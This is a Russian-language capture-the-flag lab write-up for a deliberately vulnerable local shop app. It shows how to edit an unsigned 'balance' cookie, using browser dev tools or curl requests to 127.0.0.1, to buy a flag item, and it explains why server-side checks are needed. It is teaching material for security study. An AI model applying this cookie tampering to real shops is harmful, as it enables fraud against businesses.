# Решение Cookie Shop Lab

## Цель задания

Нужно купить секретный товар `Секретный флаг`, который стоит `$1 000 000`. После успешной покупки приложение показывает флаг.

## Идея уязвимости

После регистрации или входа приложение сохраняет данные пользователя в cookie:

- `login` — имя пользователя;
- `balance` — текущий баланс.

Проблема в том, что баланс хранится на стороне клиента и никак не защищён подписью. Сервер доверяет значению из cookie `balance`, поэтому пользователь может сам изменить сумму денег и отправить запрос на покупку дорогого товара.

## Решение через браузер

1. Запустить приложение:

```bash
sudo docker pull nshkilevich/cookieshop-lab:latest

sudo docker run -d \
  --name cookieshop-lab \      
  -p 127.0.0.1:8083:8080 \  
  nshkilevich/cookieshop-lab:latest
```

2. Открыть сайт:

```text
http://127.0.0.1:8083
```

3. Зарегистрировать нового пользователя.

4. Открыть инструменты разработчика в браузере:

- Chrome/Chromium: `F12` или `Ctrl+Shift+I`;
- Firefox: `F12` или `Ctrl+Shift+I`.

5. Перейти в раздел с cookie:

- Chrome/Chromium: `Application` -> `Cookies` -> `http://127.0.0.1:8083`;
- Firefox: `Storage` -> `Cookies` -> `http://127.0.0.1:8083`.

6. Найти cookie с именем `balance`.

7. Изменить её значение с `10000` на сумму больше стоимости флага, например:

```text
1000000
```

или:

```text
2000000
```

8. Вернуться на страницу магазина и нажать кнопку покупки у товара `Секретный флаг`.

9. После успешной оплаты приложение покажет флаг:

```text
CTF{...}
```

## Решение через curl

Сначала нужно создать пользователя и сохранить cookie в файл:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8083/signup \
  -d "login=student" \
  -d "password=student123"
```

После этого можно посмотреть сохранённые cookie:

```bash
cat cookies.txt
```

В файле будет cookie `balance` со значением `10000`. Нужно заменить это значение на `1000000` или больше.

После изменения cookie отправить запрос на покупку секретного товара:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8083/buy \
  -d "product=flag"
```

Если значение `balance` достаточно большое, сервер считает, что у пользователя хватает денег, и вернёт страницу с флагом.

## Почему атака сработала

Приложение хранит важное значение `balance` в cookie и принимает его обратно без проверки. Cookie находятся на стороне пользователя, поэтому их можно просматривать и изменять.

В реальных приложениях такие данные нельзя хранить в открытом виде на клиенте. Баланс, роль пользователя, права доступа и другие критичные параметры должны проверяться на стороне сервера.
